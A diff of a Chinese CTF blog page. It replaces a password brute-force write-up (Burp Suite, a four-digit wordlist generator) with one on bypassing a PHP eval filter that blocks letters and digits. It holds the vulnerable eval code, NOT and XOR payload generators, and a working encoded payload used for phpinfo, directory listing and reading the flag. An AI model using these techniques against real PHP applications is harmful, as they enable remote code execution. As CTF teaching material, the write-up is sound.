@@ -18,25 +18,27 @@
   <meta name="author" content="Sarewitz">
   <meta name="keywords" content="">
   
-    <meta name="description" content="##爆破专家">
+    <meta name="description" content="无数字字母绕过">
 <meta property="og:type" content="article">
-<meta property="og:title" content="第一周web 爆破专家">
-<meta property="og:url" content="http://sarewitz.github.io/2023/01/14/%E7%AC%AC%E4%B8%80%E5%91%A8web/index.html">
+<meta property="og:title" content="第一周web 无数字字母绕过">
+<meta property="og:url" content="http://sarewitz.github.io/2023/01/15/%E7%AC%AC%E4%B8%80%E5%91%A8web2/index.html">
 <meta property="og:site_name" content="Sarewitz&#39;s Blog">
-<meta property="og:description" content="##爆破专家">
+<meta property="og:description" content="无数字字母绕过">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://sarewitz.github.io/images/%E7%AC%AC%E4%B8%80%E5%91%A8004.png">
-<meta property="article:published_time" content="2023-01-14T13:17:31.000Z">
-<meta property="article:modified_time" content="2023-01-14T16:43:06.737Z">
+<meta property="og:image" content="http://sarewitz.github.io/images/003.jpg">
+<meta property="article:published_time" content="2023-01-14T16:52:32.000Z">
+<meta property="article:modified_time" content="2023-01-15T11:35:22.060Z">
 <meta property="article:author" content="John Doe">
+<meta property="article:tag" content="1">
+<meta property="article:tag" content="2">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://sarewitz.github.io/images/%E7%AC%AC%E4%B8%80%E5%91%A8004.png">
+<meta name="twitter:image" content="http://sarewitz.github.io/images/003.jpg">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
   
   
-  <title>第一周web 爆破专家 - Sarewitz&#39;s Blog</title>
+  <title>第一周web 无数字字母绕过 - Sarewitz&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -275,7 +277,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="第一周web 爆破专家"></span>
+            <span id="subtitle" data-typed-text="第一周web 无数字字母绕过"></span>
           
         </div>
 
@@ -291,8 +293,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2023-01-14 21:17" pubdate>
-           2023 年 01 月 14 日 , 晚上 09:17 , 星期六
+        <time datetime="2023-01-15 00:52" pubdate>
+           2023 年 01 月 15 日 , 凌晨 12:52 , 星期日
         </time>
       </span>
     
@@ -304,7 +306,7 @@
         <i class="iconfont icon-chart"></i>
         
           <!-- compatible with older versions-->
-          306 字
+          1.4k 字
         
       </span>
     
@@ -316,7 +318,7 @@
         
         
           <!-- compatible with older versions-->
-          3 分钟
+          13 分钟
         
       </span>
     
@@ -354,22 +356,35 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">第一周web 爆破专家</h1>
+            <h1 style="display: none">第一周web 无数字字母绕过</h1>
             
             
               <div class="markdown-body">
                 
-                <p>##爆破专家</p>
+                <p>无数字字母绕过</p>
 <span id="more"></span>
-<img src="/2023/01/14/%E7%AC%AC%E4%B8%80%E5%91%A8web/101.jpg" srcset="/img/loading.gif" lazyload class title="This is an test image">
-<p>输入账号:admin ，密码:000，返回“密码错误”</p>
-<img src="/2023/01/14/%E7%AC%AC%E4%B8%80%E5%91%A8web/102.jpg" srcset="/img/loading.gif" lazyload class title="This is an test image">
-<p>可以通过抓包，对密码进行爆破<br>利用burpsuite对其抓包 （ಥ_ಥ 这个东西下载好了好长时间qwq） </p>
-<img src="/2023/01/14/%E7%AC%AC%E4%B8%80%E5%91%A8web/103.jpg" srcset="/img/loading.gif" lazyload class title="This is an test image">
-<p>账号是admin已经确定了，只需要对密码进行爆破</p>
-<p>接下来就需要爆破字典了，题目中说“纯数字且不超过四位数”<br>可以简单写一个程序</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#include&lt;stdio.h&gt;</span><br>int <span class="hljs-function"><span class="hljs-title">main</span></span>()<br>&#123;<br>	int a=0;<br>	<span class="hljs-keyword">for</span>(int i=1;i&lt;9999;i++)&#123;<br>		a=i;<br>		<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>,a);<br>	&#125;<br>	<span class="hljs-built_in">return</span> 0;<br>&#125;<br></code></pre></td></tr></table></figure>
-<p>接着在爆破的返回值中，找到返回长度不一样的就是密码了</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$code</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>];         <br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-z0-9]/is&quot;</span>,<span class="hljs-variable">$code</span>))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;NO.&quot;</span>);<br>        &#125;<br>        @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$code</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>##1<br>无数字字母绕过原理：通过利用除字母数字以外的字符进行运算从而凑出我们想要的字符<br>可以利用取反、异或等的方式构造指令<br>在网上找到了相应的脚本</p>
+<p>0x01、取反</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//在命令行中运行</span><br><br><span class="hljs-comment">/*author yu22x*/</span><br><br><span class="hljs-title function_ invoke__">fwrite</span>(STDOUT,<span class="hljs-string">&#x27;[+]your function: &#x27;</span>);<br><br><span class="hljs-variable">$system</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;\r\n&quot;</span>, <span class="hljs-string">&quot;\r&quot;</span>, <span class="hljs-string">&quot;\n&quot;</span>), <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-title function_ invoke__">fgets</span>(STDIN)); <br><br><span class="hljs-title function_ invoke__">fwrite</span>(STDOUT,<span class="hljs-string">&#x27;[+]your command: &#x27;</span>);<br><br><span class="hljs-variable">$command</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;\r\n&quot;</span>, <span class="hljs-string">&quot;\r&quot;</span>, <span class="hljs-string">&quot;\n&quot;</span>), <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-title function_ invoke__">fgets</span>(STDIN)); <br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;[*] (~&#x27;</span>.<span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-variable">$system</span>).<span class="hljs-string">&#x27;)(~&#x27;</span>.<span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-variable">$command</span>).<span class="hljs-string">&#x27;);&#x27;</span>;<br></code></pre></td></tr></table></figure>
+
+<p>0x02、异或(无引号；)</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">例：_GET  =&gt;  %a0%b8%ba%ab</span><br><span class="hljs-comment">$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=phpinfo</span><br><span class="hljs-comment">*/</span><br><span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>]=<span class="hljs-string">&quot; &quot;</span><br><span class="hljs-variable">$payload</span> = <span class="hljs-string">&#x27;&#x27;</span>;  <span class="hljs-comment">//payload</span><br><br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>]);<span class="hljs-variable">$i</span>++)<br>&#123;   <br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$j</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$j</span>&lt;<span class="hljs-number">255</span>;<span class="hljs-variable">$j</span>++)<br>    &#123;<br>        <span class="hljs-variable">$k</span> = <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$j</span>)^<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">255</span>);   <span class="hljs-comment">//dechex(255) = ff</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$k</span> == <span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>][<span class="hljs-variable">$i</span>])<br>            <span class="hljs-variable">$payload</span> .= <span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$j</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$payload</span>;<br></code></pre></td></tr></table></figure>
+
+<p>##2<br>先看一下网页的phpinfo能不能成功（注意：这道题好像还把;给ban掉了）</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=phpinfo<br>即：$&#123;_GET&#125;&#123;%ff&#125;();&amp;%ff=phpinfo<br></code></pre></td></tr></table></figure>
+<img src="/2023/01/15/%E7%AC%AC%E4%B8%80%E5%91%A8web2/002.jpg" srcset="/img/loading.gif" lazyload class title="ok">
+
+<p>接着，查看一下网页的目录，执行system (ls)。</p>
+<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm">$&#123;_<span class="hljs-meta">GET</span>&#125;[变量<span class="hljs-number">1</span>]($&#123;_<span class="hljs-meta">GET</span>&#125;[变量<span class="hljs-number">2</span>)<br></code></pre></td></tr></table></figure>
+<img src="/2023/01/15/%E7%AC%AC%E4%B8%80%E5%91%A8web2/003.jpg" srcset="/img/loading.gif" lazyload class title="ok">
+
+<p>没有找到对应的文件，继续查找上一级</p>
+<img src="/2023/01/15/%E7%AC%AC%E4%B8%80%E5%91%A8web2/005.jpg" srcset="/img/loading.gif" lazyload class title="ok">
+
+<p>最后cat fffllllaaaagggg，抓他</p>
+<img src="/2023/01/15/%E7%AC%AC%E4%B8%80%E5%91%A8web2/004.jpg" srcset="/img/loading.gif" lazyload class title="ok">
 
                 
               </div>
@@ -379,6 +394,15 @@
               <div class="post-metas my-3">
   
   
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/1/">#1</a>
+      
+        <a href="/tags/2/">#2</a>
+      
+    </div>
+  
 </div>
 
 
@@ -387,8 +411,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>第一周web 爆破专家</div>
-      <div>http://sarewitz.github.io/2023/01/14/第一周web/</div>
+      <div>第一周web 无数字字母绕过</div>
+      <div>http://sarewitz.github.io/2023/01/15/第一周web2/</div>
     </div>
     <div class="license-meta">
       
@@ -400,7 +424,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2023年1月14日</div>
+          <div>2023年1月15日</div>
         </div>
       
       
@@ -432,18 +456,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2023/01/15/%E7%AC%AC%E4%B8%80%E5%91%A8web2/" title="第一周web 无数字字母绕过">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">第一周web 无数字字母绕过</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2023/01/14/%E7%AC%AC%E4%BA%8C%E6%AC%A1%E8%AF%95%E9%AA%8C/" title="第二次试验">
-                        <span class="hidden-mobile">第二次试验</span>
+                      <a href="/2023/01/14/%E7%AC%AC%E4%B8%80%E5%91%A8web/" title="第一周web 爆破专家">
+                        <span class="hidden-mobile">第一周web 爆破专家</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
